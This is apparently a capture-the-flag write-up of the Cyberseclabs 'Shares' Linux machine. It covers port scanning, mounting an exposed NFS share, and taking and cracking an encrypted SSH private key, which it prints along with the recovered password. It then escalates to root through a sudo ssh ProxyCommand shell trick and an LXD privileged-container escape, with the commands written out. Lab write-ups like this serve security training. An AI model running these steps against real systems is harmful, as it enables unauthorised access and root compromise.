---
title: "Cyberseclabs - Shares"
classes: wide
search: false
categories: 
  - Cyberseclabs
tags:
  - nfs
  - lxd
  - lxc
  - cyberseclabs
last_modified_at: 2020-12-28T13:58:26+08:00
toc: true
toc_label: "Contents"
---

Cyberseclabs is a CTF platform like HTB or THM, some of the machine includes are Linux, windows, active directory, and some challenge. If you wanna try cyberseclab, let's follow this link https://www.cyberseclabs.co.uk/.

The first box for a new user is Shares Linux machine. Its machine has some open service like NFS file sharing, we can enumerate to the machine via NFS sharing and escalate root access using ssh.

![8b2b186ea5f6f934b72a1b58ddd2d04c.png](/assets/images/cyberseclabs-shares/b15544a646064ae1b619f780ad933589.png)

# Network Scanning

rustscan

`rustscan 172.31.1.7 --ulimit 5000 -- -sC -sV -A -oN nmap_result`

output

```
# Nmap 7.91 scan initiated Mon Dec 28 12:02:48 2020 as: nmap -sC -sV -A -oN nmap_result -vvv -p 21,80,111,2049,27853,35541,35193,44721,58677 172.31.1.7
Nmap scan report for 172.31.1.7
Host is up, received syn-ack (0.32s latency).
Scanned at 2020-12-28 12:02:49 WIB for 24s

PORT      STATE SERVICE  REASON  VERSION
21/tcp    open  ftp      syn-ack vsftpd 3.0.3
80/tcp    open  http     syn-ack Apache httpd 2.4.29 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Pet Shop
111/tcp   open  rpcbind  syn-ack 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3           2049/udp   nfs
|   100003  3           2049/udp6  nfs
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100005  1,2,3      44721/tcp   mountd
|   100005  1,2,3      45915/tcp6  mountd
|   100005  1,2,3      49409/udp6  mountd
|   100005  1,2,3      54630/udp   mountd
|   100021  1,3,4      35541/tcp   nlockmgr
|   100021  1,3,4      39565/tcp6  nlockmgr
|   100021  1,3,4      48234/udp   nlockmgr
|   100021  1,3,4      60580/udp6  nlockmgr
|   100227  3           2049/tcp   nfs_acl
|   100227  3           2049/tcp6  nfs_acl
|   100227  3           2049/udp   nfs_acl
|_  100227  3           2049/udp6  nfs_acl
2049/tcp  open  nfs_acl  syn-ack 3 (RPC #100227)
27853/tcp open  ssh      syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 97:93:e4:7f:41:79:9c:bd:3d:d8:90:c3:93:d5:53:9f (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCyk8rqOZBxSEXCu+mZCgIQOiHcAg/2ivCFVqGH0ehzvIN3eFZ5jll3zDyKehhaSyYeouoQZbpUk4fmTEqPFdUGjOzXhUhf6pQ0atKx3hms+b5ZLaCL2UjburequfIHCfDCbt6Wbj7dozIMmQ4+qjPQqBkUci7DjCTA/LbxNPL47hoC+3vAvCgRxAK6Yq4tUlil3eSgHX9EeJSxJQpDShPjTZ384+DUMx3VJbXFNBtxsUblPeykzrM18Hill3Yy/D4L9ZW0PJ5P3W+cFQuHc3RWLXCY6S1WmHDxGcI2UA3f2UaBDn2zm3cmgt3yKWTuqY98NlSh880AzmAcS6HpDlY/
|   256 11:66:e9:84:32:85:7b:c7:88:f3:19:97:74:1e:6c:29 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBDF3clGPfC6R84UaHxAMoGIYn58Njt+Dth8rsl/Aa8W9SXquC3L+TGPb5dVRArkmCgta+moG16PhstNUHlyNVbA=
|   256 cc:66:1e:1a:91:31:56:56:7c:e5:d3:46:5d:68:2a:b7 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGKX5ZbEhRnQU7woPnhhFMtk+c0HJcj0T3xPfAWHTBH9
35193/tcp open  mountd   syn-ack 1-3 (RPC #100005)
35541/tcp open  nlockmgr syn-ack 1-4 (RPC #100021)
44721/tcp open  mountd   syn-ack 1-3 (RPC #100005)
58677/tcp open  mountd   syn-ack 1-3 (RPC #100005)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Dec 28 12:03:13 2020 -- 1 IP address (1 host up) scanned in 25.38 seconds
```

open ports  
port 21: ftp  
port 80: http  
port 111: rpcbind  
port 2049: nfs  
port 27853: ssh  
port 35193: mountd  
port 35541: nlockmgr  
port 44721: mountd  
port 58677: mountd

# Enumeration

port 80: http  
![220773834aa9c519b6cc6ac0ea01e35b.png](/assets/images/cyberseclabs-shares/461bf4b559714cd08ba23b369f0e7895.png)

port 2049: nfs sharing

type: `showmount -e 172.31.1.7`  
option: `-e` : exports

![68429e82fcda5de49dc3678f01b7db9c.png](/assets/images/cyberseclabs-shares/0ee2f0735a944417b30d1a4aae2fb8af.png)

remote nfs to our machine

`sudo mkdir /mnt/Shares/ && sudo mount -t nfs 172.31.1.7:/home/amir/ /mnt/Shares && cd /mnt/Shares/`

![8f423c69f53435ead367aaec54d60a50.png](/assets/images/cyberseclabs-shares/606b7001cf714c85bb8711d27d3050fa.png)

go `.ssh` and copy file `id_rsa.bak`

```
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,8D55B7449F8965162DA3B7F2F017FC21

2lI1tgSF61MjFg2Er22GWr9hImJbuZ01I556yFoLAGNj/95ZB2H8Er9u8wfMgr8z
uB8Yuw2GmO0jJguQ4CK36kDLT/hpG5AW5WfHASzePHx58Ol2hrH+2e5IAoIwcVmi
bFN3zIYYCznn6bIvRaqwkuxaD01EG8IPxgAvm0Nr3sP539wngplyf7/+xqvPyT18
jT058FEMPFmeb+V0MHczlNWOW6wrGnxQAea2ON+IUwiSsTVSLv4QLGVWF8Lcualy
t4+4Kr47gdlxRh9HcNDztfIztimMdGp8AdV5z4KDKyL6FUVfmZqC2nxhbFUKtF7k
su7qHGpV9p9Pkglx+/rUq9NeifFcRGrhsOWctUXmWJ7BbmrqFgw1+X8ui6A/uttE
R8hEblI4obffLnGDrAO4wuH+qtA2oelwwjl/JxyqwbGH4RGAW/4AseqDzQ6RpfgQ
Sq8wBPb5MMp2ZKEzEl8qcWcwS1FCGz/VPHpnEYwfpFlcJ1kpqkiT5gmNrDFauN1m
upeSS7T5iAeHHmskbHJfNNSGYjSbTRzCSFlq2vCNXGte7jta34YCVucNHBIUR/2y
GLrm3CmVYPrjdw0irwDt+uepPfUyQQLhSqiZdbyGiljlUeij5+zJax7tOjlBBjBS
Y0rMRwiG8FGDEBbSmDZk30qB3Qb9TQcaqe9Wi/liFuxVyfbukiGW2b65JGbd7R1q
Vh6pKw4Hd35iGmVskme7evsSupEMOu9fKsJAkIrQTxadpU8wG2wkp0NTM7fh3aut
TDGKorRXOXj+cV6zehjXUYyUTesTMDh9EUVmHuixvIFX8V3w562BV28murByt7I+
ubvmZxjvh51nzpOJa4g61tnj/4OCbhFCEK4nsExh0HS11WeDAvueDauLk2Wgiw/z
/yyssrshPiXe/vxYGFJlHelyDaUSwpdrZ0AGzwUutN0rOrh3yS6yTDH2raLSa76y
e1bxe+rh2Q/iEhzqa1RbWrg7fA+5FJRLAZdYlaqlEsVt81nw4mdBCpjEbUl19egF
xIqogCAilFWvnZQ4f12JPmk0mke84idw76+SdBeof18gGiR3mWn3IyoFLRacMs5N
4zrNBXOGCVVzXCoo88ioYw1I91O57c0vbx8S40SbIevUprphf3VTZlyrRxw2AB/R
zclXHN/fEewst2maxauD+32Krm1uvTcCNk3CNre7NwPb6tB0rY3R3E7h2S/MKt0Y
eZKbFFmLwnokHqzSI8uIy8wrPj6H9R+wxT0+/KPyi3L7JIbParsHO4flBx1sMCUl
jlSNW/3J2ADP7QKA5AyjVcsIbp/aXyeJKCtglRc4Yl8mEmCroe61pCDO0mnatWxF
Y9/z6VRC61sjO4T1xYcGFSlVeXANuN8TYR8mUyvruG8OoNQ65RvgxSCRPzFe4EAm
xmXIQ4pDW59LSO7PnPdjsGN8eY7xTnG5509DYK6FoUC0T8hjp/wR9ucKDDqQoXpW
BM9cM5IPltG+wAlP39EbGMinnqgqDazWAk/wSKo4ieGLnWcNORe7Ti299tImCy0l
8zJWICDbH7bSMYyVPlWBrgUBWQ6xFI55iKdhjhlQdblZI04DoSathKFe+Khjb8bi
-----END RSA PRIVATE KEY-----
```

convert using `ssh2john`

![7944a698bc0f691aadc6dac17efea904.png](/assets/images/cyberseclabs-shares/4a48f2d53c17467fb954e5a16de4ce8e.png)

and bruteforce using `john`

![3cac0b2aafa7037497058691089497b6.png](/assets/images/cyberseclabs-shares/1b09cf0a873a45bb89ef5a367750782d.png)

amir:hello6

ssh login

![bac34cdd7f97b66bed28b45d0c90b840.png](/assets/images/cyberseclabs-shares/3a15c81e90594042b2f1582de56167f2.png)

# Privilege Escalation

check privilege escalation via sudo -> `sudo -l`

![ee7aa1191b2d70ce69974c6a4d1c6dca.png](/assets/images/cyberseclabs-shares/91ab066d13c04ccda0f8d9e2b196f64c.png)

we use `/usr/bin/python3` as `amy`

![397afacbbc1e62afd310cf322e84bf4f.png](/assets/images/cyberseclabs-shares/3e14d86d985348e1be712bdec2f41349.png)

`access.txt` on `amy`'s directory

![5f31b577f1786bcfb5db3841af43e7a8.png](/assets/images/cyberseclabs-shares/87f29349ecd04c4b892d650cf639df8b.png)

when we as `amy` find privilege escalation using `sudo -l`

![a1ef19e9317f7fd88a1368aaec02146b.png](/assets/images/cyberseclabs-shares/572d44cd2ca849708ae32006bcb9e6ca.png)

ssh reference from [https://gtfobins.github.io/gtfobins/ssh/#sudo](https://gtfobins.github.io/gtfobins/ssh/#sudo)

![4d934a503be1dcebdfc55ed4717e4f0f.png](/assets/images/cyberseclabs-shares/d068433c6bf740a68a3bf422980e3ff3.png)

`sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x`

![4e0d82861abe3cf071116bdda369e6ff.png](/assets/images/cyberseclabs-shares/06482424eab74157be96c572030b94fe.png)

## privilege escalation via lxd

back into amir, and look `id` from amir's, we found `lxd`

![b9e139e2459bf30c05b323214eb46e96.png](/assets/images/cyberseclabs-shares/9fc729109559422ab8d66efdf79fd4d8.png)

we can read and learn about 'lxd' privilege escalation 
- https://www.hackingarticles.in/lxd-privilege-escalation/
- https://book.hacktricks.xyz/linux-unix/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation

```
git clone https://github.com/saghul/lxd-alpine-builder.git
cd lxd-alpine-builder
sudo ./build-alpine 
```
![044fc45424cb694fbbff12c9fee4359d.png](/assets/images/cyberseclabs-shares/3faa926568694d34acaf17588780a608.png)

alpine-v3.12-x86_64-20201228_1430.tar.gz

![c5f81bd1846ba642cba22352686276e1.png](/assets/images/cyberseclabs-shares/36af87ba526c4fd2befeb3fa71eca0e0.png)

upload to target machine

```
wget http://10.10.1.248:8001/alpine-v3.12-x86_64-20201228_1430.tar.gz
```
```
lxc image import /tmp/alpine-v3.12-x86_64-20201228_1430.tar.gz --alias myimage
lxc storage create pool dir
lxc profile device add default root disk path=/ pool=pool
```
check storage list
```
lxc image list
```
![f662812ab4aa49ad6fcda52a81f4a3e2.png](/assets/images/cyberseclabs-shares/14c5fb79ef9342fdbed2656a9223c198.png)

check pool list
```
lxc storage list
```
![051a54f5cd145fb1b5a3ad9331d5e7da.png](/assets/images/cyberseclabs-shares/716922f5ad5a4eb39df4f688d8584111.png)

```
lxc init myimage ignite -c security.privileged=true
lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
lxc start ignite
lxc exec ignite /bin/sh
```
root directory
```
cd /mnt/root/root
```

![8bd7f93329b4b1cb2196787e30b38bd9.png](/assets/images/cyberseclabs-shares/4fc16457adba45e4b7a4d3c0d7166e69.png)

amy's directory
```
cd /mnt/root/home/amy
```
![c190baed333418b7452be9b43a50d139.png](/assets/images/cyberseclabs-shares/9fa4c349f819445c9d4e45067874dba0.png)

